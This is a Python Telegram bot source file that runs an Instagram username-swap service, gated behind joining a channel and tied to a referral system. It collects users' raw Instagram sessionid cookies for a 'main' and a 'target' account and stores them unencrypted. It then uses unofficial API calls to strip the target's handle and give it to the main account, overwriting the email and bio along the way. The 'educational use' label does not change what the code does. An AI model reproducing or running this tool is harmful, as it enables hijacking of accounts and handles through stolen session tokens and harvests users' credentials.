# botswap.py
import telebot
from telebot import types
import requests
import random
import string
import sqlite3
import time
import datetime


# ===== CONFIG =====
BOT_TOKEN = "<YOUR_BOT_TOKEN>"   # Replace with your bot token
REQUIRED_CHANNEL = "@yourchannel" # Replace with your channel name
ADMIN_IDS = {123456789}            # Replace with your admin Telegram user IDs
ADMIN_DM_ID = 123456789            # Replace with your admin Telegram user ID
DAILY_CAP = 2                      # successful swaps/day
TZ = datetime.timezone(datetime.timedelta(hours=5, minutes=30))  # IST
HELP_LINK = "https://yourhelplink.com" # Replace with your help link
SIGNATURE = "\n\n— @yourbot"         # Replace with your bot signature
# ==================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ---------- small helper to append signature ----------
def send(chat_id, text, **kwargs):
    # Always append signature for user-facing messages
    bot.send_message(chat_id, f"{text}{SIGNATURE}", **kwargs)

def reply(msg, text, **kwargs):
    bot.reply_to(msg, f"{text}{SIGNATURE}", **kwargs)

# ---------- DB ----------
db = sqlite3.connect("swapbot.db", check_same_thread=False)
cur = db.cursor()
cur.execute("""CREATE TABLE IF NOT EXISTS users(
  user_id INTEGER PRIMARY KEY,
  username TEXT,
  joined_at INTEGER,
  ref_code TEXT UNIQUE,
  referred_by INTEGER,
  swaps_today INTEGER DEFAULT 0,
  last_reset TEXT
)""")
cur.execute("""CREATE TABLE IF NOT EXISTS referrals(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  referrer_id INTEGER,
  referred_id INTEGER,
  ts INTEGER
)""")
cur.execute("""CREATE TABLE IF NOT EXISTS sessions(
  user_id INTEGER PRIMARY KEY,
  main_session TEXT,
  target_session TEXT,
  target_username TEXT
)""")
db.commit()

# ---------- Helpers ----------
def _now_date():
    return datetime.datetime.now(TZ).strftime("%Y-%m-%d")

def ensure_user(user_id, username=None):
    cur.execute("SELECT last_reset FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    if row:
        if row[0] != _now_date():
            cur.execute("UPDATE users SET swaps_today=0,last_reset=? WHERE user_id=?", (_now_date(), user_id))
            db.commit()
    else:
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        cur.execute("INSERT INTO users(user_id,username,joined_at,ref_code,last_reset) VALUES(?,?,?,?,?)",
                    (user_id, username, int(time.time()), code, _now_date()))
        db.commit()

def add_referral(referrer_id, referred_id):
    if referrer_id == referred_id: return
    cur.execute("SELECT referred_by FROM users WHERE user_id=?", (referred_id,))
    row = cur.fetchone()
    if row and row[0]: return  # already attributed
    cur.execute("UPDATE users SET referred_by=? WHERE user_id=?", (referrer_id, referred_id))
    cur.execute("INSERT INTO referrals(referrer_id,referred_id,ts) VALUES(?,?,?)",
                (referrer_id, referred_id, int(time.time())))
    db.commit()

def get_swaps_left(user_id):
    cur.execute("SELECT swaps_today FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    used = row[0] if row else 0
    return max(DAILY_CAP - used, 0)

def inc_swap(user_id):
    cur.execute("UPDATE users SET swaps_today=swaps_today+1 WHERE user_id=?", (user_id,))
    db.commit()

def save_session(user_id, main=None, target=None, target_user=None):
    cur.execute("SELECT main_session,target_session,target_username FROM sessions WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    mm, tt, tu = (row if row else (None, None, None))
    if main is not None: mm = main
    if target is not None: tt = target
    if target_user is not None: tu = target_user
    cur.execute("INSERT OR REPLACE INTO sessions(user_id,main_session,target_session,target_username) VALUES(?,?,?,?)",
                (user_id, mm, tt, tu))
    db.commit()

def get_session(user_id):
    cur.execute("SELECT main_session,target_session,target_username FROM sessions WHERE user_id=?", (user_id,))
    return cur.fetchone()

def notify_admin(text: str):
    # Admin DMs (no signature appended; internal logs)
    try:
        bot.send_message(ADMIN_DM_ID, text, disable_web_page_preview=True)
    except Exception:
        pass

# ---------- Force-Join Gate ----------
def has_access(user_id: int) -> bool:
    try:
        cm = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return cm.status in ("member", "administrator", "creator")
    except Exception:
        return False

def join_gate_kb():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("🔔 Join @stuffgot", url=f"https://t.me/{str(REQUIRED_CHANNEL).lstrip('@')}"),
        types.InlineKeyboardButton("🔄 I’ve joined, refresh", callback_data="refresh_access")
    )
    return kb

def enforce_gate(chat_id: int, user_id: int) -> bool:
    if has_access(user_id):
        return True
    send(
        chat_id,
        f"🔒 To use this bot, please join <a href='https://t.me/{str(REQUIRED_CHANNEL).lstrip('@')}'>{REQUIRED_CHANNEL}</a>, then tap <b>I’ve joined, refresh</b>.",
        reply_markup=join_gate_kb(),
        disable_web_page_preview=True
    )
    return False

@bot.callback_query_handler(func=lambda c: c.data == "refresh_access")
def cb_refresh(c):
    if has_access(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Access granted!")
        send(c.message.chat.id, WELCOME_TEXT, disable_web_page_preview=True)
    else:
        bot.answer_callback_query(c.id, "❌ Still not joined. Please join first.")

# ---------- IG helpers (educational use) ----------
def random_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def validate_session(session_id):
    url = "https://i.instagram.com/api/v1/accounts/current_user/"
    headers = {
        "User-Agent": "Instagram 194.0.0.36.172 Android",
        "Cookie": f"sessionid={session_id}"
    }
    try:
        r = requests.get(url, headers=headers, timeout=7)
        if r.status_code == 200:
            return r.json().get("user", {}).get("username")
    except Exception:
        pass
    return None

def change_username(session_id, new_username):
    url = "https://www.instagram.com/api/v1/web/accounts/edit/"
    csrf = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    data = {
        'username': new_username,
        'first_name': 'Swapped',
        'biography': 'Username swapped by @GotSwap_bot',
        'email': 'default@example.com'
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"csrftoken={csrf}; sessionid={session_id};",
        "x-csrftoken": csrf
    }
    try:
        r = requests.post(url, headers=headers, data=data, timeout=7)
        return r.status_code == 200
    except Exception:
        return False

# ---------- UI text ----------
WELCOME_TEXT = (
    "👋 <b>Welcome to the Swap Bot — courtesy of</b> <a href='https://t.me/stuffgot'>@stuffgot</a>\n\n"
    "🤖 <b>What it does</b>\n"
    "• Helps attempt Instagram username swaps.\n"
    f"• <b>Daily cap:</b> {DAILY_CAP} successful swaps/user (resets 00:00 IST).\n"
    "• <b>Referral:</b> Invite friends and grow perks.\n\n"
    "🧭 <b>Commands</b>\n"
    "/swap — Begin the username swap\n"
    "/refer — Your referral link\n"
    "/stats — Daily usage & referrals\n"
    "/do_swap — Execute swap\n"
    "/help — Help & FAQs\n"
)

# ---------- Commands ----------
@bot.message_handler(commands=['start'])
def start_cmd(m):
    ensure_user(m.from_user.id, m.from_user.username)
    # referral param (supports numeric user IDs or stored ref_code)
    parts = m.text.split(maxsplit=1)
    if len(parts) == 2:
        ref_code = parts[1].strip()
        if ref_code.isdigit():
            try: add_referral(int(ref_code), m.from_user.id)
            except Exception: pass
        else:
            cur.execute("SELECT user_id FROM users WHERE ref_code=?", (ref_code,))
            row = cur.fetchone()
            if row: add_referral(row[0], m.from_user.id)

    if not enforce_gate(m.chat.id, m.from_user.id):
        return

    send(m.chat.id, WELCOME_TEXT, disable_web_page_preview=True)
    notify_admin(f"👤 START\n• UID: {m.from_user.id}\n• UN: @{m.from_user.username or '—'}")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    send(m.chat.id, f"📘 Help & FAQs: {HELP_LINK}", disable_web_page_preview=True)

@bot.message_handler(commands=['check'])
def check_cmd(m):
    ok = has_access(m.from_user.id)
    reply(m, "✅ Access granted." if ok else f"❌ Join @stuffgot first.")

@bot.message_handler(commands=['refer'])
def refer_cmd(m):
    ensure_user(m.from_user.id, m.from_user.username)
    cur.execute("SELECT ref_code FROM users WHERE user_id=?", (m.from_user.id,))
    code = cur.fetchone()[0]
    link = f"https://t.me/{bot.get_me().username}?start={code}"
    send(m.chat.id, f"🎟 <b>Your referral link</b>\n{link}")

@bot.message_handler(commands=['stats'])
def stats_cmd(m):
    ensure_user(m.from_user.id)
    left = get_swaps_left(m.from_user.id)
    cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (m.from_user.id,))
    refs = cur.fetchone()[0]
    send(m.chat.id, f"📊 <b>Your stats</b>\n• Swaps left today: {left}/{DAILY_CAP}\n• Referrals: {refs}")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(m):
    if m.from_user.id not in ADMIN_IDS:
        reply(m, "❌ Admin only."); return
    text = m.text.partition(' ')[2].strip()
    if not text:
        reply(m, "Usage: /broadcast <message>"); return
    cur.execute("SELECT user_id FROM users")
    ids = [r[0] for r in cur.fetchall()]
    sent=fail=0
    for i, uid in enumerate(ids, 1):
        try:
            send(uid, text, disable_web_page_preview=True)
            sent += 1
        except Exception:
            fail += 1
        if i % 25 == 0:
            time.sleep(1.2)
    reply(m, f"📣 Broadcast done.\n✅ Sent: {sent}\n❌ Failed: {fail}")
    notify_admin(f"📣 Broadcast summary → Sent {sent}, Failed {fail}")

@bot.message_handler(commands=['swap'])
def swap_cmd(m):
    ensure_user(m.from_user.id)
    if not enforce_gate(m.chat.id, m.from_user.id):
        return
    left = get_swaps_left(m.from_user.id)
    if left <= 0:
        send(m.chat.id, "❌ Daily limit reached. Try again tomorrow.")
        return
    send(m.chat.id, "Send <b>Main</b> Instagram sessionid:")
    bot.register_next_step_handler(m, set_main_session)

def set_main_session(m):
    sid = m.text.strip()
    username = validate_session(sid)
    notify_admin(f"📝 MAIN SET\n• UID: {m.from_user.id}\n• TG: @{m.from_user.username or '—'}\n• Main Username: @{username or 'invalid'}")
    if username:
        save_session(m.from_user.id, main=sid)
        send(m.chat.id, f"✅ Main session OK: @{username}\nNow send <b>Target</b> sessionid:")
        bot.register_next_step_handler(m, set_target_session)
    else:
        send(m.chat.id, "❌ Invalid Main sessionid.")

def set_target_session(m):
    sid = m.text.strip()
    username = validate_session(sid)
    notify_admin(f"📝 TARGET SET\n• UID: {m.from_user.id}\n• TG: @{m.from_user.username or '—'}\n• Target Username: @{username or 'invalid'}")
    if username:
        save_session(m.from_user.id, target=sid, target_user=username)
        send(m.chat.id, f"✅ Target session OK: @{username}\nType /do_swap to start.")
    else:
        send(m.chat.id, "❌ Invalid Target sessionid.")

@bot.message_handler(commands=['do_swap'])
def do_swap(m):
    sess = get_session(m.from_user.id)
    if not sess or not sess[0] or not sess[1] or not sess[2]:
        send(m.chat.id, "⚠ Please set Main and Target sessions first."); return
    main_session, target_session, target_username = sess

    notify_admin(f"🚀 SWAP START\n• UID: {m.from_user.id}\n• Target: @{target_username}")
    send(m.chat.id, f"Changing @{target_username} → random username…")
    rand_user = random_username()
    if not change_username(target_session, rand_user):
        send(m.chat.id, "❌ Failed to change Target to random username.")
        notify_admin(f"❌ SWAP FAIL (step1) UID {m.from_user.id} @{target_username}")
        return

    send(m.chat.id, f"Changing Main → @{target_username}…")
    if change_username(main_session, target_username):
        inc_swap(m.from_user.id)
        send(m.chat.id, f"✅ Swap successful! Main now has @{target_username}")
        notify_admin(f"✅ SWAP SUCCESS UID {m.from_user.id} @{target_username}")
    else:
        send(m.chat.id, "❌ Swap failed. Target username might be lost.")
        notify_admin(f"❌ SWAP FAIL (step2) UID {m.from_user.id} @{target_username}")

print("🤖 Bot is running…")
bot.polling(none_stop=True)
